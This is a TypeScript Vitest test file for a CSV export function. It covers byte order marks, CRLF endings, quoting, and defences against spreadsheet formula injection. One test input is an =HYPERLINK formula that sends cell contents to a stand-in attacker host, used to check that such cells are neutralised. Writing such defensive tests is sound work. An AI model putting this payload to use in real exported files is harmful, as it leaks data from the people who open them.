import { describe, expect, it } from 'vitest';
import { toCsv } from './csv';

const body = (csv: string) => csv.replace(/^\uFEFF/, '');

describe('toCsv', () => {
  it('starts with a UTF-8 byte order mark and keeps accents', () => {
    const csv = toCsv(['Name'], [['Zoë Ó Briain']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect([...Buffer.from(csv, 'utf8').subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    expect(csv).toContain('Zoë Ó Briain');
  });

  it('ends every row, the last included, with CRLF and uses no bare LF', () => {
    const csv = body(
      toCsv(
        ['A', 'B'],
        [
          ['1', '2'],
          ['3', '4'],
        ],
      ),
    );
    expect(csv).toBe('A,B\r\n1,2\r\n3,4\r\n');
  });

  it('writes only the header when there are no rows', () => {
    expect(body(toCsv(['A', 'B'], []))).toBe('A,B\r\n');
  });

  it('quotes cells with commas, quotes and line breaks, doubling quotes', () => {
    const csv = body(toCsv(['x'], [['a,b'], ['say "hi"'], ['line1\nline2'], ['line1\r\nline2'], ['plain']]));
    expect(csv).toBe('x\r\n"a,b"\r\n"say ""hi"""\r\n"line1\nline2"\r\n"line1\r\nline2"\r\nplain\r\n');
  });

  it('quotes header cells too', () => {
    expect(body(toCsv(['Date, time'], []))).toBe('"Date, time"\r\n');
  });

  it('writes null as an empty cell and numbers as digits', () => {
    expect(body(toCsv(['a', 'b', 'c'], [[null, 0, 72.5]]))).toBe('a,b,c\r\n,0,72.5\r\n');
  });

  it('writes a number that is not finite as an empty cell', () => {
    expect(body(toCsv(['a', 'b'], [[Number.NaN, Number.POSITIVE_INFINITY]]))).toBe('a,b\r\n,\r\n');
  });

  describe('formula injection', () => {
    it('puts an apostrophe before each dangerous first character', () => {
      expect(body(toCsv(['x'], [['=1+1'], ['+44 7700'], ['-2+3'], ['@SUM(A1)'], ['\tTabbed']]))).toBe(
        "x\r\n'=1+1\r\n'+44 7700\r\n'-2+3\r\n'@SUM(A1)\r\n'\tTabbed\r\n",
      );
    });

    it('protects a cell that starts with a carriage return, and quotes it', () => {
      expect(body(toCsv(['x'], [['\rReturned']]))).toBe('x\r\n"\'\rReturned"\r\n');
    });

    it('neutralises a name like =HYPERLINK(...) and still quotes it correctly', () => {
      const name = '=HYPERLINK("http://evil.example/?x="&A1,"Click")';
      expect(body(toCsv(['Name'], [[name]]))).toBe(`Name\r\n"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")"\r\n`);
    });

    it('leaves numbers alone, even negative ones', () => {
      expect(body(toCsv(['n'], [[-5]]))).toBe('n\r\n-5\r\n');
    });

    it('treats a string that looks like a number as text and protects it', () => {
      expect(body(toCsv(['n'], [['-5']]))).toBe("n\r\n'-5\r\n");
    });

    it('does not touch a safe string or one with the symbol in the middle', () => {
      expect(body(toCsv(['n'], [['a=b'], ['x-ray'], ['me@here']]))).toBe('n\r\na=b\r\nx-ray\r\nme@here\r\n');
    });

    it('protects header cells too', () => {
      expect(body(toCsv(['=bad'], []))).toBe("'=bad\r\n");
    });

    it('does not protect an empty string or a string starting with a space', () => {
      expect(body(toCsv(['n'], [[''], [' =x']]))).toBe('n\r\n\r\n =x\r\n');
    });
  });
});
